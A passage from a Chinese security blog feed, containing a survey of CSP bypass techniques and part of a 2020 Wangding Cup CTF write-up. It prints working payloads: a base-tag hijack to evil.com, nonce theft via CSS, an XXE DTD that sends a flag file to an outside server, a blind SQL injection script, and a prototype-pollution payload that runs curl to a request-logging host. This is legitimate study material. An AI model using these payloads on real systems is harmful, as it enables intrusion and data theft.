        <content type="html"><![CDATA[<h1 id="bypass-csp"><a href="#bypass-csp" class="headerlink" title="bypass csp"></a>bypass csp</h1><p>内容安全策略  (<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSP" target="_blank" rel="noopener">CSP</a>) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (<a href="https://developer.mozilla.org/en-US/docs/Glossary/XSS" target="_blank" rel="noopener">XSS</a>) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。 </p><h2 id="csp语法"><a href="#csp语法" class="headerlink" title="csp语法"></a>csp语法</h2><p>CSP的特点就是他是在浏览器层面做的防护，是和同源策略同一级别，除非浏览器本身出现漏洞，否则不可能从机制上绕过。</p><p>CSP只允许被认可的JS块、JS文件、CSS等解析，只允许向指定的域发起请求。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src" target="_blank" rel="noopener"><code>default-src</code></a> :在其他资源类型没有符合自己的策略时应用该策略(有关完整列表查看<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src" target="_blank" rel="noopener"><code>default-src</code></a> )</p><p><img src="https://images.seebug.org/content/images/2017/10/7b7e1d4c-9d9a-4bd0-ae6d-f266871fa300.png-w331s" alt="image773"></p><p><img src="https://images.seebug.org/content/images/2017/10/c5a45eca-7e0c-4ebf-8143-712e4594f2fd.png-w331s" alt="image878"></p><h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><p><code>script-src &#39;nonce-r4nd0m&#39; &#39;strict-dynamic&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></p><p>script-src 中 strict-dynamic 中的作用:</p><ul><li>丢弃白名单</li><li>允许执行js生成的js代码，例如：document.createElement(‘script’) </li><li>使  nonce-only CSPs  可以工作</li></ul><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200520164256.png" alt="image1216"></p><h3 id="一些注意点"><a href="#一些注意点" class="headerlink" title="一些注意点"></a>一些注意点</h3><p><code>https://cdn.com/*</code>只能匹配<code>https://cdn.com/*</code></p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="csp策略不完全导致的绕过"><a href="#csp策略不完全导致的绕过" class="headerlink" title="csp策略不完全导致的绕过"></a>csp策略不完全导致的绕过</h3><h3 id="利用302跳转"><a href="#利用302跳转" class="headerlink" title="利用302跳转"></a>利用302跳转</h3><p><code>Content-Security-Policy: default-src &#39;self &#39;; script-src http://127.0.0.1/static/</code></p><p>如果可信域内存在一个可控的重定向文件，那么CSP的目录限制就可以被绕过。 </p><p>假设static目录下存在一个302文件</p><pre><code>Static/302.php&lt;?php Header(&quot;location: &quot;.$_GET[&#39;url&#39;])?&gt;</code></pre><p>像刚才一样，上传一个test.jpg 然后通过302.php跳转到upload目录加载js就可以成功执行</p><pre><code>&lt;script src=&quot;static/302.php?url=upload/test.jpg&quot;&gt;</code></pre><h3 id="绕过域限制的一些tricks"><a href="#绕过域限制的一些tricks" class="headerlink" title="绕过域限制的一些tricks"></a>绕过域限制的一些tricks</h3><p><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></p><pre><code class="html">&lt;link rel=&quot;prefetch&quot; href=&quot;http://lorexxar.cn&quot;&gt; (H5预加载)(only chrome)&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://lorexxar.cn&quot;&gt; （DNS预加载）&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;http://lorexxar.cn?c=[cookie]&quot;&gt;</code></pre><h3 id="利用可信域的资源绕过"><a href="#利用可信域的资源绕过" class="headerlink" title="利用可信域的资源绕过"></a>利用可信域的资源绕过</h3><p>很多网站都会将google,baidu……添加到可信域里面，而如果里面存在可控的输出我们便可以绕过csp</p><p>常用可控jsonp: <a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p><h3 id="bypass-nonce"><a href="#bypass-nonce" class="headerlink" title="bypass nonce"></a>bypass nonce</h3><h4 id="利用-lt-base-gt-标签"><a href="#利用-lt-base-gt-标签" class="headerlink" title="利用&lt;base&gt;标签"></a>利用<code>&lt;base&gt;</code>标签</h4><p>Specify a default URL and a default target for all links on a page:</p><pre><code class="html">&lt;head&gt;  &lt;base href=&quot;https://www.evil.com/&quot; target=&quot;_blank&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=&quot;images/stickman.gif&quot; width=&quot;24&quot; height=&quot;39&quot; alt=&quot;Stickman&quot;&gt;&lt;!-- load  https://www.evil.com/images/stickman.gif --&gt;&lt;a href=&quot;tags/tag_base.asp&quot;&gt;HTML base Tag&lt;/a&gt;&lt;/body&gt;&lt;!-- point to https://www.evil.com/tags/tag_base.asp --&gt;</code></pre><p>因此我们可以设置个<code>&lt;base&gt;</code>标签，将相对路径导向恶意的网站</p><pre><code class="html">&lt;!-- XSS --&gt;&lt;base href=&quot;https://evil.com/&quot;&gt;&lt;!-- End XSS --&gt;…&lt;script src=&quot;foo/bar.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre><p><a href="https://evil.com/foo/bar.js" target="_blank" rel="noopener">https://evil.com/foo/bar.js</a></p><pre><code>alert(0000);</code></pre><p>成功执行</p><p>防御方式：</p><p>在csp中添加：base-uri ‘none’ 或 base-uri ‘self’</p><h4 id="利用chrome-bug-来修改script-src的值"><a href="#利用chrome-bug-来修改script-src的值" class="headerlink" title="利用chrome bug 来修改script src的值"></a>利用chrome bug 来修改script src的值</h4><pre><code class="html">&lt;!-- XSS --&gt;&lt;svg&gt;&lt;set href=&quot;victim&quot; attributeName=&quot;href&quot; to=&quot;data:,alert(1)&quot; /&gt;&lt;!-- End XSS --&gt;…&lt;script id=&quot;victim&quot; src=&quot;foo.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre><p>SVG中的set标签可以修改其他标签的属性值</p><p>该漏洞在chrome58中修复</p><h4 id="steal-nonce"><a href="#steal-nonce" class="headerlink" title="steal nonce"></a>steal nonce</h4><h5 id="via-CSS-selectors"><a href="#via-CSS-selectors" class="headerlink" title="via CSS selectors"></a>via CSS selectors</h5><pre><code class="html">&lt;!-- XSS --&gt;&lt;style&gt;script { display: block }script[nonce^=&quot;a&quot;]:after { content: url(&quot;record?a&quot;) }script[nonce^=&quot;b&quot;]:after { content: url(&quot;record?b&quot;) }&lt;/style&gt;&lt;!-- End XSS --&gt;&lt;script src=&quot;foo/bar.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre><p>可以联合其他标签来发出请求，如<code>&lt;a&gt;</code> …</p><pre><code class="html">&lt;style&gt;script[nonce^=&quot;0&quot;]~a{background:url(&quot;http://y5pwcd.ceye.io/success&quot;)}&lt;/style&gt;</code></pre><p>相关的css 语法</p><p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors</a> </p><p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors</a> </p><h5 id="via-dangling-markup-attack"><a href="#via-dangling-markup-attack" class="headerlink" title="via dangling markup attack"></a>via dangling markup attack</h5><p>破坏原有的结构，将script标签变成文本，诱使用户点击</p><pre><code class="html">&lt;!-- XSS --&gt; &lt;form method=&quot;post&quot; action=&quot;//evil.com/form&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;click&quot;&gt;&lt;textarea name=&quot;nonce&quot;&gt;&lt;!-- End XSS --&gt;&lt;script src=&quot;foo/bar.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre><h3 id="JS-framework-based-CSP-Bypasses"><a href="#JS-framework-based-CSP-Bypasses" class="headerlink" title="JS framework-based CSP Bypasses"></a>JS framework-based CSP Bypasses</h3><p>利用低版本JQuery等js框架漏洞来绕过csp</p><h2 id="绕过实例"><a href="#绕过实例" class="headerlink" title="绕过实例"></a>绕过实例</h2><h2 id="一些工具"><a href="#一些工具" class="headerlink" title="一些工具"></a>一些工具</h2><p>检查csp: <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a> </p><p>常用可控jsonp: <a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p><p><a href="https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa" target="_blank" rel="noopener">csp mitigator</a> :一个csp调试工具</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> [Spagnuolo_Hack In Bo - So we broke all CSPs… You won’t guess what happened next!](<a href="https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack" target="_blank" rel="noopener">https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack</a> In Bo - So we broke all CSPs… You won’t guess what happened next!.pdf) </p><p><a href="https://paper.seebug.org/423/" target="_blank" rel="noopener">前端防御从入门到弃坑–CSP变迁</a></p><h2 id="收藏"><a href="#收藏" class="headerlink" title="收藏"></a>收藏</h2><p>Bypassing CSP script nonces via the browser cache： <a href="http://sebastian-lekies.de/csp/attacker.php" target="_blank" rel="noopener">http://sebastian-lekies.de/csp/attacker.php</a></p><p> <a href="https://hurricane618.me/2018/06/30/csp-bypass-summary/" target="_blank" rel="noopener">https://hurricane618.me/2018/06/30/csp-bypass-summary/</a> </p><p> <a href="https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/</a> </p><p> <a href="https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense" target="_blank" rel="noopener">https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense</a> </p><p> <a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf" target="_blank" rel="noopener">https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/05/20/bypass_csp/">https://www.ccreater.top/2020/05/20/bypass_csp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020年网鼎杯青龙组</title>
      <link href="2020/05/12/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/"/>
      <url>2020/05/12/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<h2 id="2020年第二届“网鼎杯”网络安全大赛青龙组"><a href="#2020年第二届“网鼎杯”网络安全大赛青龙组" class="headerlink" title="2020年第二届“网鼎杯”网络安全大赛青龙组"></a>2020年第二届“网鼎杯”网络安全大赛青龙组</h2><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h3><p>测试发现DownloadServlet存在目录穿越漏洞<br>读取web.xml，然后依次读取对应的class文件<br> <a href="http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml" target="_blank" rel="noopener">http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml</a> </p><p>web.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;2.5&quot;&gt;  &lt;display-name&gt;file_in_java&lt;/display-name&gt;  &lt;welcome-file-list&gt;    &lt;welcome-file&gt;upload.jsp&lt;/welcome-file&gt;  &lt;/welcome-file-list&gt;  &lt;servlet&gt;    &lt;description&gt;&lt;/description&gt;    &lt;display-name&gt;UploadServlet&lt;/display-name&gt;    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;cn.abc.servlet.UploadServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;  &lt;servlet&gt;    &lt;description&gt;&lt;/description&gt;    &lt;display-name&gt;ListFileServlet&lt;/display-name&gt;    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;cn.abc.servlet.ListFileServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/ListFileServlet&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;  &lt;servlet&gt;    &lt;description&gt;&lt;/description&gt;    &lt;display-name&gt;DownloadServlet&lt;/display-name&gt;    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;cn.abc.servlet.DownloadServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;&lt;/web-app&gt;</code></pre><p> <a href="http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class" target="_blank" rel="noopener">http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class</a></p><p> DownloadServlet</p><pre><code class="java">package cn.abc.servlet;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.io.PrintStream;import java.net.URLEncoder;import javax.servlet.RequestDispatcher;import javax.servlet.ServletContext;import javax.servlet.ServletException;import javax.servlet.ServletOutputStream;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class DownloadServlet  extends HttpServlet{  private static final long serialVersionUID = 1L;  protected void doGet(HttpServletRequest request, HttpServletResponse response)    throws ServletException, IOException  {    doPost(request, response);  }  protected void doPost(HttpServletRequest request, HttpServletResponse response)    throws ServletException, IOException  {    String fileName = request.getParameter(&quot;filename&quot;);    fileName = new String(fileName.getBytes(&quot;ISO8859-1&quot;), &quot;UTF-8&quot;);    System.out.println(&quot;filename=&quot; + fileName);    if ((fileName != null) &amp;&amp; (fileName.toLowerCase().contains(&quot;flag&quot;)))    {      request.setAttribute(&quot;message&quot;, &quot;��������&quot;);      request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response);      return;    }    String fileSaveRootPath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);    String path = findFileSavePathByFileName(fileName, fileSaveRootPath);    File file = new File(path + &quot;/&quot; + fileName);    if (!file.exists())    {      request.setAttribute(&quot;message&quot;, &quot;����������������������!&quot;);      request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response);      return;    }    String realname = fileName.substring(fileName.indexOf(&quot;_&quot;) + 1);    response.setHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + URLEncoder.encode(realname, &quot;UTF-8&quot;));    FileInputStream in = new FileInputStream(path + &quot;/&quot; + fileName);    ServletOutputStream out = response.getOutputStream();    byte[] buffer = new byte[&#39;?&#39;];    int len = 0;    while ((len = in.read(buffer)) &gt; 0) {      out.write(buffer, 0, len);    }    in.close();    out.close();  }  public String findFileSavePathByFileName(String filename, String saveRootPath)  {    int hashCode = filename.hashCode();    int dir1 = hashCode &amp; 0xF;    int dir2 = (hashCode &amp; 0xF0) &gt;&gt; 4;    String dir = saveRootPath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2;    File file = new File(dir);    if (!file.exists()) {      file.mkdirs();    }    return dir;  }}</code></pre><p>UploadServlet</p><pre><code class="java">package cn.abc.servlet;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.PrintStream;import java.util.List;import java.util.UUID;import javax.servlet.RequestDispatcher;import javax.servlet.ServletContext;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.apache.commons.fileupload.FileItem;import org.apache.commons.fileupload.FileUploadException;import org.apache.commons.fileupload.disk.DiskFileItemFactory;import org.apache.commons.fileupload.servlet.ServletFileUpload;import org.apache.poi.openxml4j.exceptions.InvalidFormatException;import org.apache.poi.ss.usermodel.Sheet;import org.apache.poi.ss.usermodel.Workbook;import org.apache.poi.ss.usermodel.WorkbookFactory;public class UploadServlet  extends HttpServlet{  private static final long serialVersionUID = 1L;  protected void doGet(HttpServletRequest request, HttpServletResponse response)    throws ServletException, IOException  {    doPost(request, response);  }  protected void doPost(HttpServletRequest request, HttpServletResponse response)    throws ServletException, IOException  {    String savePath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);    String tempPath = getServletContext().getRealPath(&quot;/WEB-INF/temp&quot;);    File tempFile = new File(tempPath);    if (!tempFile.exists()) {      tempFile.mkdir();    }    String message = &quot;&quot;;    try    {      DiskFileItemFactory factory = new DiskFileItemFactory();      factory.setSizeThreshold(102400);      factory.setRepository(tempFile);      ServletFileUpload upload = new ServletFileUpload(factory);      upload.setProgressListener(new UploadServlet.1(this));      upload.setHeaderEncoding(&quot;UTF-8&quot;);      upload.setFileSizeMax(1048576L);      upload.setSizeMax(10485760L);      if (!ServletFileUpload.isMultipartContent(request)) {        return;      }      List&lt;FileItem&gt; list = upload.parseRequest(request);      for (FileItem fileItem : list) {        if (fileItem.isFormField())        {          String name = fileItem.getFieldName();          String str1 = fileItem.getString(&quot;UTF-8&quot;);        }        else        {          String filename = fileItem.getName();          if ((filename != null) &amp;&amp; (!filename.trim().equals(&quot;&quot;)))          {            String fileExtName = filename.substring(filename.lastIndexOf(&quot;.&quot;) + 1);            InputStream in = fileItem.getInputStream();            if ((filename.startsWith(&quot;excel-&quot;)) &amp;&amp; (&quot;xlsx&quot;.equals(fileExtName))) {              try              {                Workbook wb1 = WorkbookFactory.create(in);                Sheet sheet = wb1.getSheetAt(0);                System.out.println(sheet.getFirstRowNum());              }              catch (InvalidFormatException e)              {                System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;);                e.printStackTrace();              }            }            String saveFilename = makeFileName(filename);            request.setAttribute(&quot;saveFilename&quot;, saveFilename);            request.setAttribute(&quot;filename&quot;, filename);            String realSavePath = makePath(saveFilename, savePath);            FileOutputStream out = new FileOutputStream(realSavePath + &quot;/&quot; + saveFilename);            byte[] buffer = new byte[&#39;?&#39;];            int len = 0;            while ((len = in.read(buffer)) &gt; 0) {              out.write(buffer, 0, len);            }            in.close();            out.close();            message = &quot;������������!&quot;;          }        }      }    }    catch (FileUploadException e)    {      e.printStackTrace();    }    request.setAttribute(&quot;message&quot;, message);    request.getRequestDispatcher(&quot;/ListFileServlet&quot;).forward(request, response);  }  private String makeFileName(String filename)  {    return UUID.randomUUID().toString() + &quot;_&quot; + filename;  }  private String makePath(String filename, String savePath)  {    int hashCode = filename.hashCode();    int dir1 = hashCode &amp; 0xF;    int dir2 = (hashCode &amp; 0xF0) &gt;&gt; 4;    String dir = savePath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2;    File file = new File(dir);    if (!file.exists()) {      file.mkdirs();    }    return dir;  }}</code></pre><p>在报错中我们看到 poi-ooxml-3.10<br>谷歌下可以发现它其实是有个漏洞的<a href="https://www.cnblogs.com/iyiyang/articles/10055824.html" target="_blank" rel="noopener">https://www.cnblogs.com/iyiyang/articles/10055824.html</a></p><p>在服务器上放个evil.dtd,内容为：</p><pre><code class="xml=">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://ccreater.top:60004/?%file;&#39;&gt;&quot;&gt;%all;</code></pre><p>分别在 <code>[Content_Types].xml、/xl/workbook.xml、/xl/worksheets/shee1.xml</code>  中添加<br><code>&lt;!DOCTYPE ANY SYSTEM &quot;http://ccreater.top:60000/evil.dtd&quot;&gt;  在根元素中添加&lt;b&gt;&amp;send&lt;/b&gt;</code></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200510180925.png" alt="image9568"></p><p> 监听端口拿到flag</p><h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><pre><code class="php">&lt;?phpclass FileHandler {    public $op;    public $filename;    public $content;    function __construct() {        $op = &quot;2e0&quot;;        $filename = &quot;flag.php&quot;;    }    public function set($filename) {        $this-&gt;op = &#39;2e0&#39;;        $this-&gt;filename = $filename;    }}$url = &#39;http://5f56366ab1864e38b5d46f4b070e8082a5878207423a4008.cloudgame1.ichunqiu.com/?str=&#39;;$file = new FileHandler;$file-&gt;set($_GET[1]);$payload = urlencode(serialize($file));echo file_get_contents($url . $payload);#echo urlencode(serialize($payload));</code></pre><p>利用弱类型比较来绕过<code>if($this-&gt;op === &quot;2&quot;)$this-&gt;op = &quot;1&quot;;</code><br>将FileHandler中的变量改为public来绕过is_valid的限制<br>读取 /proc/self/cmdline 得知配置文件：<code>/web/config/httpd.conf</code><br>读取配置文件得知 web目录：<code>DocumentRoot &quot;/web/html&quot;</code><br>读取flag:<code>/web/html/flag.php</code></p><h3 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h3><p>只有一个register.php,fuzz方向存在sql注入漏洞<br>由于题目限制最多只能插入20个数据，于是我们让mysql在运算的时候报错就不会插入数据，避免了多次重开容器的麻烦<br>测试后，具体payload为:<code>username=&#39;,&#39;aaa&#39;-if(ascii(select substr(database(),1,1))&gt;1,sleep(5)-exp(~(select * from(select user())a)),exp(~(select * from(select user())a))))%23&amp;password=aaa</code></p><p>因为information_schema被过滤，还有其他的一些能够查询表名的表不存在，于是只能猜测表名</p><p>盲注脚本：</p><pre><code class="python">import requestsimport time#修改bigger和sqlinj就好#实现bigger才能使用def findByDichotomy(begin,end):    max_num=end    while True:        mid=int((begin+end)/2)        if begin==max_num:            return False        if begin==end:            return begin        if end-begin==1:            if bigger(begin):                return end            else:                return begin        if bigger(mid):            begin=mid+1        else:            end=mid#待求数据大于numdef bigger(num):    time.sleep(0.5)    sql=&quot;select group_concat(b) from (select (select 1)a,(select 2)b union select * from flag)`table`&quot;    burp0_url = &quot;http://2e22e4f7edf54994ae0a08c8acf108e6b85804ee8a8144c6.cloudgame2.ichunqiu.com:80/register_do.php&quot;    burp0_cookies = {&quot;UM_distinctid&quot;: &quot;16f8014229c357-04d5c848290106-6701b35-240000-16f8014229d768&quot;, &quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1587227364&quot;, &quot;Hm_lpvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1589089931&quot;, &quot;__jsluid_h&quot;: &quot;5303c9bcf8d25c671142a156f959a817&quot;}    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://2e22e4f7edf54994ae0a08c8acf108e6b85804ee8a8144c6.cloudgame2.ichunqiu.com/register.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    burp0_data = {&quot;username&quot;: &quot;&#39;,&#39;aaa&#39;-if((ascii(substr(( {sql} ),{POS},2))&gt;{GUESS}),sleep(2)-exp(~(select * from(select user())a)),exp(~(select * from(select user())a))))#&quot;.format(GUESS=num,POS=pos,sql=sql), &quot;password&quot;: &quot;aaa&quot;}    try:        r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,timeout=2)    except Exception:        return True    print(&quot;test &quot;+str(num))    print(r.text)    return Falsedef less(num):    passdef equal(num):    pass#1,flag{}result=&quot;2,flag{&quot;pos=len(result)+1while True:    num=findByDichotomy(32,128)    if num is False:        print(result)        break    result+=chr(num)    print(result)    pos+=1</code></pre><h3 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h3><p>源代码:</p><pre><code class="javascript">var express = require(&#39;express&#39;);var path = require(&#39;path&#39;);const undefsafe = require(&#39;undefsafe&#39;);const { exec } = require(&#39;child_process&#39;);var app = express();class Notes {    constructor() {        this.owner = &quot;whoknows&quot;;        this.num = 0;        this.note_list = {};    }    write_note(author, raw_note) {        this.note_list[(this.num++).toString()] = {&quot;author&quot;: author,&quot;raw_note&quot;:raw_note};    }    get_note(id) {        var r = {}        undefsafe(r, id, undefsafe(this.note_list, id));        return r;    }    edit_note(id, author, raw) {        undefsafe(this.note_list, id + &#39;.author&#39;, author);        undefsafe(this.note_list, id + &#39;.raw_note&#39;, raw);    }    get_all_notes() {        return this.note_list;    }    remove_note(id) {        delete this.note_list[id];    }}var notes = new Notes();notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#39;s first note&quot;);app.set(&#39;views&#39;, path.join(__dirname, &#39;views&#39;));app.set(&#39;view engine&#39;, &#39;pug&#39;);app.use(express.json());app.use(express.urlencoded({ extended: false }));app.use(express.static(path.join(__dirname, &#39;public&#39;)));app.get(&#39;/&#39;, function(req, res, next) {  res.render(&#39;index&#39;, { title: &#39;Notebook&#39; });});app.route(&#39;/add_note&#39;)    .get(function(req, res) {        res.render(&#39;mess&#39;, {message: &#39;please use POST to add a note&#39;});    })    .post(function(req, res) {        let author = req.body.author;        let raw = req.body.raw;        if (author &amp;&amp; raw) {            notes.write_note(author, raw);            res.render(&#39;mess&#39;, {message: &quot;add note sucess&quot;});        } else {            res.render(&#39;mess&#39;, {message: &quot;did not add note&quot;});        }    })app.route(&#39;/edit_note&#39;)    .get(function(req, res) {        res.render(&#39;mess&#39;, {message: &quot;please use POST to edit a note&quot;});    })    .post(function(req, res) {        let id = req.body.id;        let author = req.body.author;        let enote = req.body.raw;        if (id &amp;&amp; author &amp;&amp; enote) {            notes.edit_note(id, author, enote);            res.render(&#39;mess&#39;, {message: &quot;edit note sucess&quot;});        } else {            res.render(&#39;mess&#39;, {message: &quot;edit note failed&quot;});        }    })app.route(&#39;/delete_note&#39;)    .get(function(req, res) {        res.render(&#39;mess&#39;, {message: &quot;please use POST to delete a note&quot;});    })    .post(function(req, res) {        let id = req.body.id;        if (id) {            notes.remove_note(id);            res.render(&#39;mess&#39;, {message: &quot;delete done&quot;});        } else {            res.render(&#39;mess&#39;, {message: &quot;delete failed&quot;});        }    })app.route(&#39;/notes&#39;)    .get(function(req, res) {        let q = req.query.q;        let a_note;        if (typeof(q) === &quot;undefined&quot;) {            a_note = notes.get_all_notes();        } else {            a_note = notes.get_note(q);        }        res.render(&#39;note&#39;, {list: a_note});    })app.route(&#39;/status&#39;)    .get(function(req, res) {        let commands = {            &quot;script-1&quot;: &quot;uptime&quot;,            &quot;script-2&quot;: &quot;free -m&quot;        };        for (let index in commands) {            exec(commands[index], {shell:&#39;/bin/bash&#39;}, (err, stdout, stderr) =&gt; {                if (err) {                    return;                }                console.log(`stdout: ${stdout}`);            });        }        res.send(&#39;OK&#39;);        res.end();    })app.use(function(req, res, next) {  res.status(404).send(&#39;Sorry cant find that!&#39;);});app.use(function(err, req, res, next) {  console.error(err.stack);  res.status(500).send(&#39;Something broke!&#39;);});const port = 8080;app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:${port}`))</code></pre><p>谷歌发现unsafe的某些版本存在原型链污染漏洞 <a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></p><p>阅读代码发现可以通过edit_note来污染原型链结合status处来命令执行</p><p>payload:<code>id=__proto__.abc&amp;author=curl http://http.requestbin.buuoj.cn/19tjk5d1?aaaaa=1&amp;raw=ls</code></p><p>令我有些不解的是，我本地复现payload为：<code>id=__proto__&amp;author=curl 